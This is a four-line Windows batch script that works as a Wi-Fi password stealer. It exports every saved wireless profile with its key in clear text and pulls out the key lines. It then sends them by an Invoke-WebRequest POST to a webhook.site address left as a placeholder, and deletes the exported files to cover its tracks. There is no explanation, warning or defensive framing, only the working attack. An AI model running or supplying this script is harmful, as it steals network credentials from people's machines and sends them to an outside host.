netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS
del Wi-* /s /f /q
